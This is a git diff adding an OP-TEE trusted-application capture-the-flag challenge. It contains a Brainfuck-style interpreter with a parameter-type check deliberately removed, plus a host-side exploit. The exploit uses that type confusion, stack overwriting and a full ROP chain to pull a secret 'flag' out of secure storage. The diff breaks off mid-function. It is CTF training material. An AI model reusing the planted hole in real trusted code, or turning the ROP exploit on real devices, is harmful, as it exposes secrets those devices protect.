diff --git a/trust_issues/Android.mk b/trust_issues/Android.mk
new file mode 100644
index 0000000..4308250
--- /dev/null
+++ b/trust_issues/Android.mk
@@ -0,0 +1,19 @@
+###################### sas-trust-issues ######################
+LOCAL_PATH := $(call my-dir)
+
+include $(CLEAR_VARS)
+LOCAL_CFLAGS += -DANDROID_BUILD
+LOCAL_CFLAGS += -Wall
+
+LOCAL_SRC_FILES += host/main.c
+
+LOCAL_C_INCLUDES := $(LOCAL_PATH)/ta/include
+
+LOCAL_SHARED_LIBRARIES := libteec
+LOCAL_MODULE := sas_trust_issues
+LOCAL_VENDOR_MODULE := true
+LOCAL_MODULE_TAGS := optional
+
+include $(BUILD_EXECUTABLE)
+
+include $(LOCAL_PATH)/ta/Android.mk
diff --git a/trust_issues/CMakeLists.txt b/trust_issues/CMakeLists.txt
new file mode 100644
index 0000000..03f62a0
--- /dev/null
+++ b/trust_issues/CMakeLists.txt
@@ -0,0 +1,13 @@
+project(sas_trust_issues C)
+
+set(SRC host/main.c)
+
+add_executable(${PROJECT_NAME} ${SRC})
+
+target_include_directories(${PROJECT_NAME}
+	PRIVATE ta/include
+	PRIVATE include)
+
+target_link_libraries(${PROJECT_NAME} PRIVATE teec)
+
+install(TARGETS ${PROJECT_NAME} DESTINATION ${CMAKE_INSTALL_BINDIR})
diff --git a/trust_issues/Makefile b/trust_issues/Makefile
new file mode 100644
index 0000000..b188683
--- /dev/null
+++ b/trust_issues/Makefile
@@ -0,0 +1,15 @@
+export V?=0
+
+# If _HOST or _TA specific compilers are not specified, then use CROSS_COMPILE
+HOST_CROSS_COMPILE ?= $(CROSS_COMPILE)
+TA_CROSS_COMPILE ?= $(CROSS_COMPILE)
+
+.PHONY: all
+all:
+	$(MAKE) -C host CROSS_COMPILE="$(HOST_CROSS_COMPILE)" --no-builtin-variables
+	$(MAKE) -C ta CROSS_COMPILE="$(TA_CROSS_COMPILE)" LDFLAGS=""
+
+.PHONY: clean
+clean:
+	$(MAKE) -C host clean
+	$(MAKE) -C ta clean
diff --git a/trust_issues/host/Makefile b/trust_issues/host/Makefile
new file mode 100644
index 0000000..79ebafe
--- /dev/null
+++ b/trust_issues/host/Makefile
@@ -0,0 +1,28 @@
+CC      ?= $(CROSS_COMPILE)gcc
+LD      ?= $(CROSS_COMPILE)ld
+AR      ?= $(CROSS_COMPILE)ar
+NM      ?= $(CROSS_COMPILE)nm
+OBJCOPY ?= $(CROSS_COMPILE)objcopy
+OBJDUMP ?= $(CROSS_COMPILE)objdump
+READELF ?= $(CROSS_COMPILE)readelf
+
+OBJS = main.o
+
+CFLAGS += -Wall -I../ta/include -I$(TEEC_EXPORT)/include -I./include
+#Add/link other required libraries here
+LDADD += -lteec -L$(TEEC_EXPORT)/lib
+
+BINARY = sas_ta_exploitation_exploit
+
+.PHONY: all
+all: $(BINARY)
+
+$(BINARY): $(OBJS)
+	$(CC) $(LDFLAGS) -o $@ $< $(LDADD)
+
+.PHONY: clean
+clean:
+	rm -f $(OBJS) $(BINARY)
+
+%.o: %.c
+	$(CC) $(CFLAGS) -c $< -o $@
diff --git a/trust_issues/host/main.c b/trust_issues/host/main.c
new file mode 100644
index 0000000..d1fe941
--- /dev/null
+++ b/trust_issues/host/main.c
@@ -0,0 +1,431 @@
+#include <ctype.h>
+#include <err.h>
+#include <stdint.h>
+#include <stdio.h>
+#include <stdlib.h>
+#include <string.h>
+
+/* OP-TEE TEE client API (built by optee_client) */
+#include <tee_client_api.h>
+
+/* For the UUID (found in the TA's h-file(s)) */
+#include <trust_issues_ta.h>
+
+typedef struct {
+  TEEC_Context *ctx;
+  TEEC_Session *sess;
+} TrustletSession_t;
+
+typedef enum TA_ARG {
+  TA_ARG_CODE = 0,
+  TA_ARG_INPUT = 1,
+  TA_ARG_OUTPUT = 2,
+} TA_ARG_t;
+
+#define REGION_SIZE (0x3000 * 3)
+
+typedef struct {
+  char object_id[4];
+  char flag_bytes[128];
+  uint32_t object_handle;
+  uint32_t read_bytes;
+} RopData_t;
+
+TrustletSession_t open_session() {
+  TEEC_Result res;
+  TEEC_Context *ctx = malloc(sizeof(TEEC_Context));
+  TEEC_Session *sess = malloc(sizeof(TEEC_Session));
+  TrustletSession_t session = {ctx, sess};
+  uint32_t err_origin;
+
+  res = TEEC_InitializeContext(NULL, ctx);
+  if (res != TEEC_SUCCESS)
+    errx(1, "TEEC_InitializeContext failed with code 0x%x", res);
+
+  const TEEC_UUID uuid = TA_TRUST_ISSUES_UUID;
+  res = TEEC_OpenSession(ctx, sess, &uuid, TEEC_LOGIN_PUBLIC, NULL, NULL,
+                         &err_origin);
+  if (res != TEEC_SUCCESS)
+    errx(1, "TEEC_Opensession failed with code 0x%x origin 0x%x", res,
+         err_origin);
+
+  return session;
+}
+
+void finalize_session(TrustletSession_t *sess) {
+  TEEC_CloseSession(sess->sess);
+  TEEC_FinalizeContext(sess->ctx);
+
+  free(sess->ctx);
+  free(sess->sess);
+}
+
+void run_command(TrustletSession_t *sess, TEEC_Operation *op) {
+  TEEC_Result res;
+  uint32_t err_origin;
+  res = TEEC_InvokeCommand(sess->sess, TA_TRUST_ISSUES_CMD_RUN_CODE, op,
+                           &err_origin);
+  // if (res != TEEC_SUCCESS)
+  //   errx(1, "TEEC_InvokeCommand failed with code 0x%x origin 0x%x", res,
+  //        err_origin);
+}
+
+// Helper function to set the tmpref argument for the TEEC_Operation.
+void set_tmpref_arg(const TA_ARG_t arg_idx, TEEC_Operation *op, char *data,
+                    uint32_t data_len) {
+  op->params[arg_idx].tmpref.buffer = data;
+  op->params[arg_idx].tmpref.size = data_len;
+}
+
+// Helper function to set the value argument for the TEEC_Operation.
+void set_value_arg(const TA_ARG_t arg_idx, TEEC_Operation *op, uint32_t a,
+                   uint32_t b) {
+  op->params[arg_idx].value.a = a;
+  op->params[arg_idx].value.b = b;
+}
+
+// Conversion functions.
+uint32_t high_dword(const uint64_t val) { return (val >> 32) & 0xffffffffull; }
+uint32_t low_dword(const uint64_t val) { return val & 0xffffffffull; }
+
+uint64_t u64(const char *input) { return *(uint64_t *)input; }
+uint32_t u32(const char *input) { return *(uint32_t *)input; }
+
+void p64(uint64_t val, char *out_ptr) {
+  memcpy(out_ptr, &val, sizeof(uint64_t));
+}
+
+void p32(uint64_t val, char *out_ptr) {
+  memcpy(out_ptr, &val, sizeof(uint32_t));
+}
+
+#define P32(val, out_ptr)                                                      \
+  {                                                                            \
+    p32(val, out_ptr);                                                         \
+    out_ptr += sizeof(uint32_t);                                               \
+  }
+
+void generate_readn(char *buf, const uint32_t n) {
+  for (uint32_t i = 0; i < n; i++) {
+    buf[i] = ',';
+  }
+}
+
+void generate_writen(char *buf, const uint32_t n) {
+  for (uint32_t i = 0; i < n; i++) {
+    buf[i] = '.';
+  }
+}
+
+void generate_mem_next(char *buf, const uint32_t n) {
+  for (uint32_t i = 0; i < n; i++) {
+    buf[i] = '>';
+  }
+}
+
+void generate_mem_prev(char *buf, const uint32_t n) {
+  for (uint32_t i = 0; i < n; i++) {
+    buf[i] = '<';
+  }
+}
+
+/**
+ * buf: Buffer to write the ROP chain to.
+ * input_param_location: Address of the input parameter (input buffer) in the
+ * TA memory.
+ * stack_base: Base address of the stack in the TA memory.
+ */
+void write_rop(char *buf, const uint32_t ta_code_base,
+               const uint32_t input_param_location, const uint32_t stack_base) {
+  // TEE_ObjectHandle object;
+
+  // TEE_Result __cdecl OpenPersistentObjectWrapper(
+  //       TEE_ObjectHandle *object = stack_base + 4 + 128,
+  //       const unsigned __int8 *obj_id = "flag",
+  //       size_t obj_id_sz = 4,
+  //       uint32_t obj_data_flag = TEE_DATA_FLAG_ACCESS_READ |
+  //       TEE_DATA_FLAG_SHARE_READ = 0x11)
+
+  // res = TEE_ReadObjectData(object, data, object_info.dataSize, &read_bytes);
+
+  // 0x00001f4c : pop {r0, r1, r2, r3} ; pop {ip, pc}
+  const uint32_t pop_r0_r1_r2_r3_pop_ip_pc = ta_code_base + 0x00001f84;
+  const uint32_t memcpy_unchecked =
+      ta_code_base + 0x11AE4 | 1; // Skip `STRD.W R7, LR, [SP,#var_8]!`
+  const uint32_t openpersistentobjectwrapper =
+      ta_code_base + 0x61c | 1; // Skip `STRD.W R7, LR, [SP, #-8]!`
+  const uint32_t tee_read_object_data =
+      ta_code_base + 0x5A28 | 1; // Skip `STRD.W R7, LR, [SP,#var_8]!`
+
+  char *rop_chain_start = buf;
+  // Open the persistent object.
+  P32(pop_r0_r1_r2_r3_pop_ip_pc, rop_chain_start);
+  P32(stack_base + offsetof(RopData_t, object_handle), rop_chain_start); // r0
+  P32(stack_base + offsetof(RopData_t, object_id), rop_chain_start);     // r1
+  P32(sizeof(((RopData_t *)0)->object_id), rop_chain_start);             // r2
+  P32(0x11, rop_chain_start);                                            // r3
+  P32(0x45454545, rop_chain_start);                                      // ip
+  P32(openpersistentobjectwrapper, rop_chain_start);                     // pc
+
+  // Dereference the object handle. Basically use memcpy, to copy the value from
+  // the stack_base + 0x26a8, to our current part of the rop-chain.
+  P32(0x41414141, rop_chain_start);
+  P32(pop_r0_r1_r2_r3_pop_ip_pc, rop_chain_start);
+  P32(stack_base + 0x26a8, rop_chain_start);                             // r0
+  P32(stack_base + offsetof(RopData_t, object_handle), rop_chain_start); // r1
+  P32(sizeof(((RopData_t *)0)->object_handle), rop_chain_start);         // r2
+  P32(0x41414141, rop_chain_start);                                      // r3
+  P32(0x41414141, rop_chain_start);                                      // ip
+  P32(memcpy_unchecked, rop_chain_start);                                // pc
+
+  P32(0x41414141, rop_chain_start); // r7
+  P32(pop_r0_r1_r2_r3_pop_ip_pc, rop_chain_start);
+  P32(0x41424344, rop_chain_start); // r0 = object_handle (dummy value, replaced
+                                    // in the rop-chain using memcpy call)
+  P32(stack_base + offsetof(RopData_t, flag_bytes),
+      rop_chain_start);      // r1 = data buffer
+  P32(128, rop_chain_start); // r2 = data size
+  P32(stack_base + offsetof(RopData_t, read_bytes),
+      rop_chain_start);                       // r3 = actual bytes read
+  P32(0x41414141, rop_chain_start);           // ip
+  P32(tee_read_object_data, rop_chain_start); // pc
+
+  // Copy the object data to the output buffer.
+  P32(0x41414141, rop_chain_start);
+  P32(pop_r0_r1_r2_r3_pop_ip_pc, rop_chain_start);
+  P32(input_param_location + 0x01b8,
+      rop_chain_start); // r0 = input_param_location
+  P32(stack_base + offsetof(RopData_t, flag_bytes),
+      rop_chain_start); // r1 = stack_base + offsetof(RopData_t, flag_bytes)
+  P32(sizeof(((RopData_t *)0)->flag_bytes), rop_chain_start); // r2 = 128
+  P32(0x41414141, rop_chain_start);                           // r3 = 0x41414141
+  P32(0x41414141, rop_chain_start);                           // ip
+  P32(memcpy_unchecked, rop_chain_start);                     // pc
+}
+
+int do_exploit(void) {
+  TEEC_Operation op;
+  TrustletSession_t sess = open_session();
+
+  char *code = calloc(sizeof(char), REGION_SIZE);
+  char *input = calloc(sizeof(char), REGION_SIZE);
+  char *output = calloc(sizeof(char), REGION_SIZE);
+
+  // ### 1: During the first invocation we expect to read the ELF header of the
+  // TA.
+  memset(&op, 0, sizeof(op));
+  op.paramTypes = TEEC_PARAM_TYPES(TEEC_MEMREF_TEMP_INOUT, TEEC_VALUE_INOUT,
+                                   TEEC_MEMREF_TEMP_INOUT, TEEC_NONE);
+
+  const uint32_t guessed_code_base = 0x00117000; // Where RX section starts.
+
+  generate_readn(code, 0x200);
+  generate_mem_prev(code + 0x200, 0x200);
+  generate_writen(code + 0x400, 0x200);
+
+  set_tmpref_arg(TA_ARG_CODE, &op, code, strlen(code));
+  // Exploit type-confusion here. We're pointing the input buffer to the
+  // location of .GOT, and if we get lucky (=defeat aslr), the program will dump
+  // the pointers we're interested in.
+  set_value_arg(TA_ARG_INPUT, &op, guessed_code_base, 0x42424242);
+  set_tmpref_arg(TA_ARG_OUTPUT, &op, output, REGION_SIZE);
+
+  run_command(&sess, &op);
+
+  // We expect to see bytes of the `TA_CreateEntryPoint` function in the output
+  if (memcmp(output, "\x4D\xF8\x04\x7D\x00\xAF\x4F\xF0\x00\x03", 10) != 0)
+    errx(1, "Failed to guess the base address of the TA code section!");
+
+  // Stack is always at 0x0014a000
+  const uint32_t stack_base = 0x0014a000;
+
+  printf("TA Code Base: 0x%08x\n", guessed_code_base);
+  printf("Stack Base: 0x%08x\n", stack_base);
+
+  // ### 2: During the second invocation we can store everything we need near
+  // the stack base.
+
+  memset(code, 0, REGION_SIZE);
+  memset(&op, 0, sizeof(op));
+
+  RopData_t *rop_data = (RopData_t *)input;
+  memcpy(rop_data->object_id, "flag",
+         4); // Store object_id at the top of the stack.
+
+  op.paramTypes =
+      TEEC_PARAM_TYPES(TEEC_MEMREF_TEMP_INOUT, TEEC_MEMREF_TEMP_INOUT,
+                       TEEC_VALUE_INOUT, TEEC_NONE);
+  generate_readn(code, 0x500);            // Get 0x3000 bytes from "input".
+  generate_mem_prev(code + 0x500, 0x500); // Move the memory pointer back.
+  generate_writen(
+      code + 0x500 + 0x500,
+      0x500); // Write 0x3000 bytes to "output" (actually stack of the TA)
+
+  set_tmpref_arg(TA_ARG_CODE, &op, code, strlen(code));
+  set_tmpref_arg(TA_ARG_INPUT, &op, input, REGION_SIZE);
+  set_value_arg(TA_ARG_OUTPUT, &op, stack_base, 0x41414141);
+
+  run_command(&sess, &op);
+
+  // ### 3: During the third invocation we're overwriting part of the stack with
+  // rop-chain to write the data to our output buffer. If everything is done
+  // correctly, we'll be able to read decrypted flag from this buffer.
+
+  memset(code, 0, REGION_SIZE);
+  memset(&op, 0, sizeof(op));
+
+  const uint32_t input_param_location = 0x00200000;
+  printf("Input param location: 0x%08x\n", input_param_location);
+  write_rop(input, guessed_code_base, input_param_location, stack_base);
+
+  op.paramTypes =
+      TEEC_PARAM_TYPES(TEEC_MEMREF_TEMP_INPUT, TEEC_MEMREF_TEMP_INOUT,
+                       TEEC_VALUE_INOUT, TEEC_NONE);
+  generate_readn(code, 0x500);            // Get 0x3000 bytes from "input".
+  generate_mem_prev(code + 0x500, 0x500); // Move the memory pointer back.
+  generate_writen(
+      code + 0x500 + 0x500,
+      0x500); // Write 0x3000 bytes to "output" (actually stack of the TA)
+
+  set_tmpref_arg(TA_ARG_CODE, &op, code, strlen(code));
+  set_tmpref_arg(TA_ARG_INPUT, &op, input, REGION_SIZE);
+  set_value_arg(TA_ARG_OUTPUT, &op, stack_base + 0x2664, 0x41414141);
+
+  run_command(&sess, &op);
+
+  // Finally, read the data from the input buffer.
+  printf("Input buffer (should be flag???): %s\n", input);
+
+  // Gracefully shutdown the session.
+  finalize_session(&sess);
+
+  free(code);
+  free(input);
+  free(output);
+
+  return 0;
+}
+
+int store_flag(const char *flag) {
+  TEEC_Result res;
+  TEEC_Context ctx;
+  TEEC_Session sess;
+  TEEC_Operation op;
+  TEEC_UUID uuid = TA_TRUST_ISSUES_UUID;
+  uint32_t err_origin;
+
+  res = TEEC_InitializeContext(NULL, &ctx);
+  if (res != TEEC_SUCCESS)
+    errx(1, "TEEC_InitializeContext failed with code 0x%x", res);
+
+  res = TEEC_OpenSession(&ctx, &sess, &uuid, TEEC_LOGIN_PUBLIC, NULL, NULL,
+                         &err_origin);
+  if (res != TEEC_SUCCESS)
+    errx(1, "TEEC_Opensession failed with code 0x%x origin 0x%x", res,
+         err_origin);
+
+  memset(&op, 0, sizeof(op));
+  op.paramTypes = TEEC_PARAM_TYPES(
+      TEEC_MEMREF_TEMP_INPUT, TEEC_MEMREF_TEMP_INPUT, TEEC_NONE, TEEC_NONE);
+
+  char storage_id[] = "flag";
+
+  op.params[0].tmpref.buffer = storage_id;
+  op.params[0].tmpref.size = sizeof(storage_id) - 1;
+
+  char flag_data[1024] = {0};
+  size_t data_len = strlen(flag) + 1;
+  if (data_len > sizeof(flag_data))
+    errx(1, "Flag is too long");
+
+  memcpy(flag_data, flag, data_len);
+
+  op.params[1].tmpref.buffer = flag_data;
+  op.params[1].tmpref.size = data_len;
+
+  res = TEEC_InvokeCommand(&sess, TA_TRUST_ISSUES_CMD_WRITE_SECURE_OBJECT, &op,
+                           &err_origin);
+  if (res != TEEC_SUCCESS)
+    errx(1, "TEEC_InvokeCommand failed with code 0x%x origin 0x%x", res,
+         err_origin);
+
+  TEEC_CloseSession(&sess);
+  TEEC_FinalizeContext(&ctx);
+
+  return 0;
+}
+
+int read_flag() {
+  TEEC_Result res;
+  TEEC_Context ctx;
+  TEEC_Session sess;
+  TEEC_Operation op;
+  TEEC_UUID uuid = TA_TRUST_ISSUES_UUID;
+  uint32_t err_origin;
+
+  res = TEEC_InitializeContext(NULL, &ctx);
+  if (res != TEEC_SUCCESS)
+    errx(1, "TEEC_InitializeContext failed with code 0x%x", res);
+
+  res = TEEC_OpenSession(&ctx, &sess, &uuid, TEEC_LOGIN_PUBLIC, NULL, NULL,
+                         &err_origin);
+  if (res != TEEC_SUCCESS)
+    errx(1, "TEEC_Opensession failed with code 0x%x origin 0x%x", res,
+         err_origin);
+
+  memset(&op, 0, sizeof(op));
+  op.paramTypes = TEEC_PARAM_TYPES(
+      TEEC_MEMREF_TEMP_INPUT, TEEC_MEMREF_TEMP_OUTPUT, TEEC_NONE, TEEC_NONE);
+
+  char storage_id[] = "flag";
+
+  op.params[0].tmpref.buffer = storage_id;
+  op.params[0].tmpref.size = sizeof(storage_id) - 1;
+
+  char flag_data[1024] = {0};
+
+  op.params[1].tmpref.buffer = flag_data;
+  op.params[1].tmpref.size = 1024;
+
+  res = TEEC_InvokeCommand(&sess, TA_TRUST_ISSUES_CMD_READ_SECURE_OBJECT, &op,
+                           &err_origin);
+  if (res != TEEC_SUCCESS)
+    errx(1, "TEEC_InvokeCommand failed with code 0x%x origin 0x%x", res,
+         err_origin);
+
+  printf("Flag: %s\n", (char *)op.params[1].tmpref.buffer);
+  printf("Flag size: %zu\n", op.params[1].tmpref.size);
+
+  TEEC_CloseSession(&sess);
+  TEEC_FinalizeContext(&ctx);
+
+  return 0;
+}
+
+int main(int argc, char *argv[]) {
+  if (argc < 2) {
+    fprintf(stderr, "Usage: %s <command> [args]\n", argv[0]);
+    fprintf(stderr, "Commands:\n");
+    fprintf(stderr, "  exploit\n");
+    fprintf(stderr, "  store_flag <flag>\n");
+    fprintf(stderr, "  read_flag (non-production only)\n");
+    return 1;
+  }
+
+  if (strcmp(argv[1], "exploit") == 0) {
+    do_exploit();
+  } else if (strcmp(argv[1], "store_flag") == 0) {
+    if (argc < 3) {
+      fprintf(stderr, "Usage: %s store_flag <flag>\n", argv[0]);
+      return 1;
+    }
+    store_flag(argv[2]);
+  } else if (strcmp(argv[1], "read_flag") == 0) {
+    read_flag();
+  } else {
+    fprintf(stderr, "Unknown command: %s\n", argv[1]);
+    return 1;
+  }
+
+  return 0;
+}
diff --git a/trust_issues/ta/Android.mk b/trust_issues/ta/Android.mk
new file mode 100644
index 0000000..df4bb7b
--- /dev/null
+++ b/trust_issues/ta/Android.mk
@@ -0,0 +1,4 @@
+LOCAL_PATH := $(call my-dir)
+
+local_module := 41414141-7472-7573-745f-697373756573.ta
+include $(BUILD_OPTEE_MK)
diff --git a/trust_issues/ta/Makefile b/trust_issues/ta/Makefile
new file mode 100644
index 0000000..a2fa0c5
--- /dev/null
+++ b/trust_issues/ta/Makefile
@@ -0,0 +1,13 @@
+CFG_TEE_TA_LOG_LEVEL ?= 4
+CFG_TA_OPTEE_CORE_API_COMPAT_1_1=y
+
+# The UUID for the Trusted Application
+BINARY=41414141-7472-7573-745f-697373756573
+
+-include $(TA_DEV_KIT_DIR)/mk/ta_dev_kit.mk
+
+ifeq ($(wildcard $(TA_DEV_KIT_DIR)/mk/ta_dev_kit.mk), )
+clean:
+	@echo 'Note: $$(TA_DEV_KIT_DIR)/mk/ta_dev_kit.mk not found, cannot clean TA'
+	@echo 'Note: TA_DEV_KIT_DIR=$(TA_DEV_KIT_DIR)'
+endif
diff --git a/trust_issues/ta/include/trust_issues_ta.h b/trust_issues/ta/include/trust_issues_ta.h
new file mode 100644
index 0000000..b9d62eb
--- /dev/null
+++ b/trust_issues/ta/include/trust_issues_ta.h
@@ -0,0 +1,16 @@
+#ifndef TA_TRUST_ISSUES_H
+#define TA_TRUST_ISSUES_H
+
+#define TA_TRUST_ISSUES_UUID                                                   \
+  {                                                                            \
+    0x41414141, 0x7472, 0x7573, {                                              \
+      0x74, 0x5f, 0x69, 0x73, 0x73, 0x75, 0x65, 0x73                           \
+    }                                                                          \
+  }
+
+/* The function IDs implemented in this TA */
+#define TA_TRUST_ISSUES_CMD_RUN_CODE 0
+#define TA_TRUST_ISSUES_CMD_WRITE_SECURE_OBJECT 1
+#define TA_TRUST_ISSUES_CMD_READ_SECURE_OBJECT 2
+
+#endif /*TA_TRUST_ISSUES_H*/
diff --git a/trust_issues/ta/sub.mk b/trust_issues/ta/sub.mk
new file mode 100644
index 0000000..c1a7164
--- /dev/null
+++ b/trust_issues/ta/sub.mk
@@ -0,0 +1,5 @@
+global-incdirs-y += include
+srcs-y += trust_issues_ta.c
+
+# To remove a certain compiler flag, add a line like this
+#cflags-template_ta.c-y += -Wno-strict-prototypes
diff --git a/trust_issues/ta/trust_issues_ta.c b/trust_issues/ta/trust_issues_ta.c
new file mode 100644
index 0000000..95a4e85
--- /dev/null
+++ b/trust_issues/ta/trust_issues_ta.c
@@ -0,0 +1,381 @@
+#include "include/trust_issues_ta.h"
+#include "tee_api_types.h"
+#include <string.h>
+#include <tee_internal_api.h>
+#include <tee_internal_api_extensions.h>
+
+#include <trust_issues_ta.h>
+
+#define STAGING_BUILD 1
+// #define PARTICIPANTS_BUILD 1
+#define MEMORY_SIZE 0x4000
+
+typedef struct {
+  const char *code;
+  const size_t code_sz;
+
+  char *input;
+  size_t input_idx;
+  const size_t input_sz;
+
+  char *output;
+  size_t output_idx;
+  const size_t output_sz;
+
+  char *memory;
+  size_t memory_idx;
+  const size_t memory_sz;
+} VmContext_t;
+
+/*
+ * Called when the instance of the TA is created. This is the first call in
+ * the TA.
+ */
+TEE_Result TA_CreateEntryPoint(void) { return TEE_SUCCESS; }
+
+/*
+ * Called when the instance of the TA is destroyed if the TA has not
+ * crashed or panicked. This is the last call in the TA.
+ */
+void TA_DestroyEntryPoint(void) {}
+
+/*
+ * Called when a new session is opened to the TA. *sess_ctx can be updated
+ * with a value to be able to identify this session in subsequent calls to the
+ * TA. In this function you will normally do the global initialization for the
+ * TA.
+ */
+TEE_Result TA_OpenSessionEntryPoint(uint32_t param_types,
+                                    TEE_Param __maybe_unused params[4],
+                                    void __maybe_unused **sess_ctx) {
+  /* Unused parameters */
+  (void)param_types;
+  (void)&params;
+  (void)&sess_ctx;
+
+  /* If return value != TEE_SUCCESS the session will not be created. */
+  return TEE_SUCCESS;
+}
+
+/*
+ * Called when a session is closed, sess_ctx hold the value that was
+ * assigned by TA_OpenSessionEntryPoint().
+ */
+void TA_CloseSessionEntryPoint(void __maybe_unused *sess_ctx) {
+  (void)&sess_ctx; /* Unused parameter */
+}
+
+static bool validate_memory_bounds(VmContext_t *context) {
+  if (context->memory_idx >= context->memory_sz) {
+    EMSG("Memory index out of bounds");
+    return false;
+  }
+  if (context->input_idx >= context->input_sz) {
+    EMSG("Input index out of bounds");
+    return false;
+  }
+  if (context->output_idx >= context->output_sz) {
+    EMSG("Output index out of bounds");
+    return false;
+  }
+  return true;
+}
+
+static TEE_Result run_code(VmContext_t *context) {
+  // + and - to increment/decrement memory at pointer
+  // > and < to move pointer
+  // . to output byte
+  // , to read byte from input
+
+  for (size_t i = 0; i < context->code_sz; i++) {
+    const char c = context->code[i];
+    switch (c) {
+    case '+':
+      // IMSG("+ -> Incrementing memory at index %zu", context->memory_idx);
+      if (!validate_memory_bounds(context)) {
+        return TEE_ERROR_BAD_PARAMETERS;
+      }
+      context->memory[context->memory_idx]++;
+      break;
+    case '-':
+      // IMSG("- -> Decrementing memory at index %zu", context->memory_idx);
+      if (!validate_memory_bounds(context)) {
+        return TEE_ERROR_BAD_PARAMETERS;
+      }
+      context->memory[context->memory_idx]--;
+      break;
+    case '>':
+      context->memory_idx++;
+      // IMSG("> -> Moving memory pointer to index %zu", context->memory_idx);
+      break;
+    case '<':
+      context->memory_idx--;
+      // IMSG("< -> Moving memory pointer to index %zu", context->memory_idx);
+      break;
+    case '.':
+      // IMSG(". -> Outputting byte at index %zu", context->memory_idx);
+      if (!validate_memory_bounds(context)) {
+        return TEE_ERROR_BAD_PARAMETERS;
+      }
+      context->output[context->output_idx++] =
+          context->memory[context->memory_idx++];
+      break;
+    case ',':
+      // IMSG(", -> Reading byte into memory at index %zu",
+      // context->memory_idx);
+      if (!validate_memory_bounds(context)) {
+        return TEE_ERROR_BAD_PARAMETERS;
+      }
+      context->memory[context->memory_idx++] =
+          context->input[context->input_idx++];
+      break;
+    default:
+      EMSG("Unknown command: %02x", c);
+      return TEE_ERROR_BAD_PARAMETERS;
+    }
+  }
+
+  IMSG("Memory after execution: %s", context->memory);
+
+  return TEE_SUCCESS;
+}
+
+static TEE_Result run_code_cmd(uint32_t param_types, TEE_Param params[4]) {
+  uint32_t exp_param_types =
+      TEE_PARAM_TYPES(TEE_PARAM_TYPE_MEMREF_INPUT, // "Brainfuck" code
+                      TEE_PARAM_TYPE_MEMREF_INOUT, // Input buffer
+                      TEE_PARAM_TYPE_MEMREF_INOUT, // Output buffer
+                      TEE_PARAM_TYPE_NONE);
+
+  // Oooops, forgot to check param types :(
+  // if (param_types != exp_param_types) {
+  //   EMSG("Invalid parameter types: 0x%08x, expected: 0x%08x", param_types,
+  //        exp_param_types);
+  //   return TEE_ERROR_BAD_PARAMETERS;
+  // }
+
+  const char *code = params[0].memref.buffer;
+  const size_t code_sz = params[0].memref.size;
+
+  char *input = params[1].memref.buffer;
+  const size_t input_sz = params[1].memref.size;
+
+  char *output = params[2].memref.buffer;
+  const size_t output_sz = params[2].memref.size;
+
+  IMSG("Code ptr: %p, code size: %zu", code, code_sz);
+  IMSG("Input ptr: %p, input size: %zu", input, input_sz);
+  IMSG("Output ptr: %p, output size: %zu", output, output_sz);
+
+  char *memory = TEE_Malloc(MEMORY_SIZE, 0);
+  if (!memory)
+    return TEE_ERROR_OUT_OF_MEMORY;
+
+  VmContext_t context = {.code = code,
+                         .code_sz = code_sz,
+                         .input = input,
+                         .input_idx = 0,
+                         .input_sz = input_sz,
+                         .output = output,
+                         .output_idx = 0,
+                         .output_sz = output_sz,
+                         .memory = memory,
+                         .memory_idx = 0,
+                         .memory_sz = MEMORY_SIZE};
+
+  return run_code(&context);
+}
+
+static TEE_Result write_secure_object_cmd(uint32_t param_types,
+                                          TEE_Param params[4]) {
+  const uint32_t exp_param_types =
+      TEE_PARAM_TYPES(TEE_PARAM_TYPE_MEMREF_INPUT, TEE_PARAM_TYPE_MEMREF_INPUT,
+                      TEE_PARAM_TYPE_NONE, TEE_PARAM_TYPE_NONE);
+  TEE_ObjectHandle object;
+  TEE_Result res;
+  char *obj_id;
+  size_t obj_id_sz;
+  char *data;
+  size_t data_sz;
+  uint32_t obj_data_flag;
+
+  /*
+   * Safely get the invocation parameters
+   */
+  if (param_types != exp_param_types)
+    return TEE_ERROR_BAD_PARAMETERS;
+
+  obj_id_sz = params[0].memref.size;
+  obj_id = TEE_Malloc(obj_id_sz, 0);
+  if (!obj_id)
+    return TEE_ERROR_OUT_OF_MEMORY;
+
+  TEE_MemMove(obj_id, params[0].memref.buffer, obj_id_sz);
+
+  data_sz = params[1].memref.size;
+  data = TEE_Malloc(data_sz, 0);
+  if (!data)
+    return TEE_ERROR_OUT_OF_MEMORY;
+  TEE_MemMove(data, params[1].memref.buffer, data_sz);
+
+  /*
+   * Create object in secure storage and fill with data
+   */
+  obj_data_flag =
+      TEE_DATA_FLAG_ACCESS_READ |       /* we can later read the oject */
+      TEE_DATA_FLAG_ACCESS_WRITE |      /* we can later write into the object */
+      TEE_DATA_FLAG_ACCESS_WRITE_META | /* we can later destroy or rename the
+                                           object */
+      TEE_DATA_FLAG_OVERWRITE;          /* destroy existing object of same ID */
+
+  res = TEE_CreatePersistentObject(TEE_STORAGE_PRIVATE, obj_id, obj_id_sz,
+                                   obj_data_flag, TEE_HANDLE_NULL, NULL,
+                                   0, /* we may not fill it right now */
+                                   &object);
+  if (res != TEE_SUCCESS) {
+    EMSG("TEE_CreatePersistentObject failed 0x%08x", res);
+    TEE_Free(obj_id);
+    TEE_Free(data);
+    return res;
+  }
+
+  res = TEE_WriteObjectData(object, data, data_sz);
+  if (res != TEE_SUCCESS) {
+    EMSG("TEE_WriteObjectData failed 0x%08x", res);
+    TEE_CloseAndDeletePersistentObject1(object);
+  } else {
+    TEE_CloseObject(object);
+  }
+  TEE_Free(obj_id);
+  TEE_Free(data);
+  return res;
+}
+
+// Simplifies the ROP quite a bit, cause we don't need to craft a primitive
+// that can call functions with more than 4 parameters.
+static TEE_Result OpenPersistentObjectWrapper(TEE_ObjectHandle *object,
+                                              const char *obj_id,
+                                              size_t obj_id_sz,
+                                              uint32_t obj_data_flag) {
+  TEE_Result res = TEE_OpenPersistentObject(TEE_STORAGE_PRIVATE, obj_id,
+                                            obj_id_sz, obj_data_flag, object);
+  if (res != TEE_SUCCESS) {
+    EMSG("Failed to open persistent object, res=0x%08x", res);
+  }
+  return res;
+}
+
+#ifdef PARTICIPANTS_BUILD
+static TEE_Result read_secure_object_cmd(uint32_t param_types,
+                                         TEE_Param params[4]) {
+  const uint32_t exp_param_types =
+      TEE_PARAM_TYPES(TEE_PARAM_TYPE_MEMREF_INPUT, TEE_PARAM_TYPE_MEMREF_OUTPUT,
+                      TEE_PARAM_TYPE_NONE, TEE_PARAM_TYPE_NONE);
+  TEE_ObjectHandle object;
+  TEE_ObjectInfo object_info;
+  TEE_Result res;
+  uint32_t read_bytes;
